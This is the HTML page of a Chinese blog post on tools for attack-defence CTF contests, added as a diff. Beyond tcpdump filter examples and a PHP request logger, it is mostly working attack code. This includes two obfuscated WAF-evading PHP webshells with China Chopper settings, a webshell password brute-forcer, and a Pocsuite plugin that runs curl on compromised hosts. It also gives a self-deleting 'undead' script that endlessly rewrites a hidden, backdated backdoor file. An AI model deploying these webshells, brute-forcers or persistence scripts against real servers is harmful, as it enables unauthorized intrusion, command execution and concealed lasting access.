@@ -1,0 +1,1345 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="编程,CTF,Python,PHP,自动化,tcpdump,webshell," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="w2n1ck" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="上上周打了大学生涯的最后一场CTF比赛，感觉给老师丢人了，自己赛前准备的东西也没咋用上，很憋屈啊！不说了，还是太菜！这两周忙着毕业设计的事，一直没时间写。把自己收集的资料分享下吧，如有错误，请大牛们指导下。">
+<meta name="keywords" content="编程,CTF,Python,PHP,自动化,tcpdump,webshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF线下赛相关工具">
+<meta property="og:url" content="http://byd.dropsec.xyz/2017/05/16/CTF线下赛相关工具/index.html">
+<meta property="og:site_name" content="w2n1ck">
+<meta property="og:description" content="上上周打了大学生涯的最后一场CTF比赛，感觉给老师丢人了，自己赛前准备的东西也没咋用上，很憋屈啊！不说了，还是太菜！这两周忙着毕业设计的事，一直没时间写。把自己收集的资料分享下吧，如有错误，请大牛们指导下。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/CTF1.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/CTF2.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/CTF3.png">
+<meta property="og:updated_time" content="2017-07-28T11:19:40.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF线下赛相关工具">
+<meta name="twitter:description" content="上上周打了大学生涯的最后一场CTF比赛，感觉给老师丢人了，自己赛前准备的东西也没咋用上，很憋屈啊！不说了，还是太菜！这两周忙着毕业设计的事，一直没时间写。把自己收集的资料分享下吧，如有错误，请大牛们指导下。">
+<meta name="twitter:image" content="http://oa8y5guqs.bkt.clouddn.com/CTF1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键词进行搜索","hits_empty":"找不到关于“${query}”的文章","hits_stats":"共找到 ${hits} 篇文化在那个，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://byd.dropsec.xyz/2017/05/16/CTF线下赛相关工具/"/>
+
+
+
+
+
+  <title>CTF线下赛相关工具 | w2n1ck</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?61c879c1c104a92aab1d6e4b6888ffe5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w2n1ck</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Looking at yourself from a different Angle!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/daima" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wrench"></i> <br />
+            
+            工具
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-daohang">
+          <a href="/daohang" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br />
+            
+            导航
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://byd.dropsec.xyz/2017/05/16/CTF线下赛相关工具/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w2n1ck">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w2n1ck">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF线下赛相关工具</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-16T16:33:33+08:00">
+                2017-05-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/05/16/CTF线下赛相关工具/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/05/16/CTF线下赛相关工具/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>上上周打了大学生涯的最后一场CTF比赛，感觉给老师丢人了，自己赛前准备的东西也没咋用上，很憋屈啊！不说了，还是太菜！这两周忙着毕业设计的事，一直没时间写。把自己收集的资料分享下吧，如有错误，请大牛们指导下。<br><a id="more"></a></p>
+<h1 id="一、linux-tcpdump使用"><a href="#一、linux-tcpdump使用" class="headerlink" title="一、linux tcpdump使用"></a>一、linux tcpdump使用</h1><p>tcpdump的重要性不用我说了吧，都懂，但是在CTF中可能会没有权限使用。但是工作中肯定会用到的，相信我，不要为CTF而CTF…（不好意思扯淡了 =.=）</p>
+<h2 id="1-1、过滤主机"><a href="#1-1、过滤主机" class="headerlink" title="1.1、过滤主机"></a>1.1、过滤主机</h2><p>抓取所有经过eth1，目的或源地址是192.168.1.1的网络数据<br>    tcpdump -i eth1 host 192.168.1.1<br>指定源地址<br>    tcpdump -i eth1 src host 192.168.1.1<br>指定目的地址<br>    tcpdump -i eth1 dst host 192.168.1.1</p>
+<h2 id="1-2、过滤端口"><a href="#1-2、过滤端口" class="headerlink" title="1.2、过滤端口"></a>1.2、过滤端口</h2><p>抓取所有经过eth1，目的或源端口是25的网络数据<br>    tcpdump -i eth1 port 25<br>指定源端口<br>    tcpdump -i eth1 src port 25<br>指定目的端口<br>    tcpdump -i eth1 dst port 25</p>
+<h2 id="1-3、网络过滤"><a href="#1-3、网络过滤" class="headerlink" title="1.3、网络过滤"></a>1.3、网络过滤</h2><pre><code>tcpdump -i eth1 net 192.168
+tcpdump -i eth1 src net 192.168
+tcpdump -i eth1 dst net 192.168
+</code></pre><h2 id="1-4、协议过滤"><a href="#1-4、协议过滤" class="headerlink" title="1.4、协议过滤"></a>1.4、协议过滤</h2><pre><code>tcpdump -i eth1 arp
+tcpdump -i eth1 ip
+tcpdump -i eth1 tcp
+tcpdump -i eth1 udp
+tcpdump -i eth1 icmp
+</code></pre><h2 id="1-5、常用表达式"><a href="#1-5、常用表达式" class="headerlink" title="1.5、常用表达式"></a>1.5、常用表达式</h2><pre><code>非 : ! or &quot;not&quot; (去掉双引号)
+且 : &amp;&amp; or &quot;and&quot;
+或 : || or &quot;or&quot;
+</code></pre><p>抓取所有经过eth1，目的地址是192.168.1.254或192.168.1.200端口是80的TCP数据<br>    tcpdump -i eth1 ‘((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))’<br>抓取所有经过eth1，目标MAC地址是00:01:02:03:04:05的ICMP数据<br>    tcpdump -i eth1 ‘((icmp) and ((ether dst host 00:01:02:03:04:05)))’<br>抓取所有经过eth1，目的网络是192.168，但目的主机不是192.168.1.200的TCP数据<br>    tcpdump -i eth1 ‘((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200)))’</p>
+<h1 id="二、一句话木马"><a href="#二、一句话木马" class="headerlink" title="二、一句话木马"></a>二、一句话木马</h1><p>一句话木马主要达到的目的就是就算别人看到了这个webshell，他们也不会用。不然别人直接利用你，用的webshell收割flag。我从自己搜集的过waf的webshell中挑了两个。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;</div></pre></td></tr></table></figure></p>
+<p>原理我就不讲了，看一下你就明白了，很简单。<code>QGV2YWwoJF9QT1NUWzBdKTs=</code>随意变。<br>菜刀配置填<code>&lt;O&gt;n985de9=QGV2YWwoJF9QT1NUWzBdKTs=&lt;/O&gt;</code><br>连接密码:0（零）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;</div></pre></td></tr></table></figure></p>
+<p>菜刀连接密码:1，自己可以改改，主要学思路。</p>
+<h1 id="三、webshell爆破"><a href="#三、webshell爆破" class="headerlink" title="三、webshell爆破"></a>三、webshell爆破</h1><p>简单粗暴，只要发现，啥都不用想，拿起工具就是干！<br>webshell爆破采用之前tools分享的思路，Apache一次允许同时提交1000个参数， IIS允许一次提交5883个参数。<br>这里我主要用了两个，一个是K8写的GUI版本的，支持PHP、JSP、ASP、ASPX等<br><img src="http://oa8y5guqs.bkt.clouddn.com/CTF1.png" alt=""><br>一个是自己写的PHP的。<br><img src="http://oa8y5guqs.bkt.clouddn.com/CTF2.png" alt=""><br>主要代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">1000处理</div><div class="line">for i in range(0,dics):</div><div class="line">    new_group = []</div><div class="line">    for m in range(i*1000,(i+1)*1000):</div><div class="line">        new_group.append(group[m])</div><div class="line">        m += 1</div><div class="line">    for n in new_group:</div><div class="line">        post_data[n] = &apos;echo &quot;password is :%s&quot;;&apos; % n</div><div class="line">    req = requests.post(url,data=post_data)</div><div class="line">    print u&quot;正在进行第 %s 组字典爆破&quot; % str(i + 1)</div><div class="line">    print req.content+&apos;****************************-SUCCESS!&apos;</div><div class="line">    post_data.clear()</div><div class="line">余数处理</div><div class="line">new_group1 = []</div><div class="line">for kk in range(dics*1000, len(content)):</div><div class="line">    new_group1.append(group[kk])</div><div class="line">    kk += 1</div><div class="line">for each in new_group1:</div><div class="line">    post_data[each] = &apos;echo &quot;password is %s&quot;;&apos; % each</div><div class="line">r = requests.post(url,data=post_data)</div><div class="line">print u&quot;正在进行余数字典爆破&quot;</div><div class="line">print r.content+&apos;****************************-SUCCESS!&apos;</div></pre></td></tr></table></figure></p>
+<h1 id="四、批量发包程序"><a href="#四、批量发包程序" class="headerlink" title="四、批量发包程序"></a>四、批量发包程序</h1><p>目的很简单，就是对所在网段的其他主机批量进行某一个操作，具体怎么做，拿它干嘛，看自己思维了。<br>主要代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">def sender(domain):</div><div class="line">    #proxies = &#123; &quot;http&quot;: &quot;http://127.0.0.1:8888&quot;&#125;</div><div class="line">    url = domain</div><div class="line">    post_data =&quot;password=ls&quot;</div><div class="line">    payload = &quot;header test&quot;</div><div class="line">    headers = &#123;&apos;content-type&apos;: payload,&apos;User-Agent&apos;:random.choice(config[&apos;USER_AGENTS&apos;])&#125;</div><div class="line">    request = urllib2.Request(url,post_data,headers)</div><div class="line">    response = urllib2.urlopen(request,timeout=config[&apos;timeout&apos;])</div><div class="line">    if response.getcode() == 200:</div><div class="line">        res = response.read()</div><div class="line">        return res</div><div class="line">    else:</div><div class="line">        return 0</div></pre></td></tr></table></figure></p>
+<p>加入了多线程，随机UA等(其实Python的多线程很鸡肋的，你要测试过对比下时间你就知道了。原因你可以查下进程、线程关于多核CPU的利用相关的一些资料)。</p>
+<h1 id="五、Pocsuite"><a href="#五、Pocsuite" class="headerlink" title="五、Pocsuite"></a>五、Pocsuite</h1><p>神器，就不解释了。其实原理很简单，做了个批量化的框架，自己写插件。主要验证代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">def _verify(self):</div><div class="line">        import re</div><div class="line">        result = &#123;&#125;</div><div class="line">        webshellpath = &quot;/ctf/webshell.php&quot;   # 配置webshell所在目录</div><div class="line">        payload = &quot;&#123;domain&#125;&quot; + webshellpath</div><div class="line"></div><div class="line">        for pwd in self.pwdList:</div><div class="line">            exp_url = payload.format(domain=self.url) + &apos;?&apos; + pwd + &apos;=echo &quot;dropsec&quot;;&apos;</div><div class="line">            print exp_url</div><div class="line"></div><div class="line">        # exp_url = (payload.format(domain=self.url))</div><div class="line">            data = &#123;</div><div class="line">                pwd : u&apos;&apos;&apos;echo &quot;dropsec&quot;;&apos;&apos;&apos;</div><div class="line">            &#125;</div><div class="line">            try:</div><div class="line">                response = req.post(exp_url, data=data, timeout=10, verify=False)</div><div class="line">            except Exception, e:</div><div class="line">                return self.parse_output(result)</div><div class="line">            if response.status_code != 404:</div><div class="line">                result[&apos;VerifyInfo&apos;] = &#123;&#125;</div><div class="line">                result[&apos;VerifyInfo&apos;][&apos;status_code&apos;] = response.status_code</div><div class="line">                result[&apos;VerifyInfo&apos;][&apos;is&apos;] = &apos;password wrong&apos;</div><div class="line">                if &apos;dropsec&apos; in response.content:</div><div class="line">                    result[&apos;VerifyInfo&apos;][&apos;url&apos;] = exp_url</div><div class="line">                    result[&apos;VerifyInfo&apos;][&apos;is&apos;] = &apos;password yes&apos;</div><div class="line">                    data = &#123;</div><div class="line">                        pwd : u&apos;&apos;&apos;system(&apos;curl http://192.168.2.3:8080/ctf/webshell.php&apos;);&apos;&apos;&apos;</div><div class="line">                        #pwd : u&apos;&apos;&apos;system(&apos;curl http://10.0.1.2&apos;);&apos;&apos;&apos;</div><div class="line">                    &#125;</div><div class="line">                    try:</div><div class="line">                        response = req.post(exp_url, data=data, timeout=10, verify=False)</div><div class="line">                        result[&apos;VerifyInfo&apos;][&apos;flag&apos;] = response.content</div><div class="line">                        return self.parse_output(result)</div><div class="line">                    except Exception, e:</div><div class="line">                        return self.parse_output(result)</div><div class="line"></div><div class="line">        return self.parse_output(result)</div></pre></td></tr></table></figure></p>
+<h1 id="六、批量上传文件"><a href="#六、批量上传文件" class="headerlink" title="六、批量上传文件"></a>六、批量上传文件</h1><p>做这个的目的其实就是因为第一次玩CTF线下赛手速慢，为了以后不在因为这个问题在跌倒而做的。PS:其实这个小功能有时候还是很有用的。我多读书多，不骗你-.-{斜眼}<br><img src="http://oa8y5guqs.bkt.clouddn.com/CTF3.png" alt=""></p>
+<h1 id="七、权限维持"><a href="#七、权限维持" class="headerlink" title="七、权限维持"></a>七、权限维持</h1><p>CTF的权限维持很简单啊，就是木马别被删不就好了。并不需要提权啊什么的啊{捂脸}，有时候你考虑问题要结合实际啊，咋简单就咋来嘛。就是做个不死马就好了。<br>PS:这种小伎俩只是对付一般的CTF比赛，对那种赛棍肯定不适用了，人家写个条件竞争的，分分钟打哭你啊{捂脸}，所以还得看情况，该反弹还是要反弹啊。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    set_time_limit(0);</div><div class="line">    ignore_user_abort(1);</div><div class="line">    unlink(__FILE__);</div><div class="line">    //file_put_contents(__FILE__,&apos;&apos;);</div><div class="line">    while(1)&#123;</div><div class="line">        file_put_contents(&apos;C:\phpStudy\WWW\ctf\.config.php&apos;,&apos;&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[\&apos;n985de9\&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;&apos;);</div><div class="line">        system(&apos;chmod 777 .config.php&apos;);</div><div class="line">        touch(&quot;.config.php&quot;,mktime(20,15,1,11,28,2016));</div><div class="line">        usleep(100);</div><div class="line">        &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>上传这个文件之后，批量访问，就会一直生成木马文件。<br><strong>PS：</strong>大家试想下，要是比赛中存在一个一句话后门，利用批量上传程序，将这个后门批量上上传到各个靶机上，再利用批量发包程序访问这个后门，再利用pocsuite,然后。。。哈哈哈，是不是很爽。(理想很丰满啊…)</p>
+<h1 id="八、日志记录"><a href="#八、日志记录" class="headerlink" title="八、日志记录"></a>八、日志记录</h1><p>主要是为了网站访问记录，便于后续的问题排查，就是把各种字段的数据记录下来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</div><div class="line">$ip        = $_SERVER[&quot;REMOTE_ADDR&quot;];   //访问IP</div><div class="line">$filename  = $_SERVER[&apos;PHP_SELF&apos;];  //访问的文件</div><div class="line">$parameter = $_SERVER[&quot;QUERY_STRING&quot;];  //查询的字符串</div><div class="line">$method    = $_SERVER[&apos;REQUEST_METHOD&apos;]; //请求方法</div><div class="line">...</div><div class="line">$time      =  date(&apos;Y-m-d H:i:s&apos;,time()); //请求时间</div><div class="line">$post      = file_get_contents(&quot;php://input&quot;,&apos;r&apos;); //接收POST数据</div><div class="line">$others    = &apos;**********************************************************************&apos;;</div><div class="line">$logadd    = &apos;访问时间：&apos;.$time.&apos;访问IP:&apos;.$ip.&apos;请求方法：&apos;.$method.&apos; &apos;.&apos;访问链接：&apos;.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;...</div><div class="line">//记录写入</div><div class="line">$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);</div><div class="line">fwrite($fh, $logadd);</div><div class="line">fwrite($fh,print_r($_COOKIE, true).&quot;\r\n&quot;);</div><div class="line">fwrite($fh,$others.&quot;\r\n&quot;);</div><div class="line">fclose($fh);</div></pre></td></tr></table></figure></p>
+<h1 id="九、文件监控"><a href="#九、文件监控" class="headerlink" title="九、文件监控"></a>九、文件监控</h1><p>网上自己搜搜吧，很多</p>
+<h1 id="十、WAF"><a href="#十、WAF" class="headerlink" title="十、WAF"></a>十、WAF</h1><p>网上自己搜搜吧，很多</p>
+<p>PS：九和十，注意分寸，不能影响正常业务的。</p>
+<p>。。。</p>
+<p>好久没写这么长的博客了。。。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>大爷，赏个铜板呗！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/weixin.png" alt="w2n1ck WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/zhifubao.png" alt="w2n1ck Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      w2n1ck
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://byd.dropsec.xyz/2017/05/16/CTF线下赛相关工具/" title="CTF线下赛相关工具">http://byd.dropsec.xyz/2017/05/16/CTF线下赛相关工具/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/编程/" rel="tag"><i class="fa fa-tag"></i> 编程</a>
+          
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/Python/" rel="tag"><i class="fa fa-tag"></i> Python</a>
+          
+            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+          
+            <a href="/tags/自动化/" rel="tag"><i class="fa fa-tag"></i> 自动化</a>
+          
+            <a href="/tags/tcpdump/" rel="tag"><i class="fa fa-tag"></i> tcpdump</a>
+          
+            <a href="/tags/webshell/" rel="tag"><i class="fa fa-tag"></i> webshell</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/04/29/漏洞挖掘之子域名采集/" rel="next" title="漏洞挖掘之子域名采集">
+                <i class="fa fa-chevron-left"></i> 漏洞挖掘之子域名采集
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/06/02/爬虫入库实战之免费代理/" rel="prev" title="爬虫入库实战之干死反爬虫">
+                爬虫入库实战之干死反爬虫 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
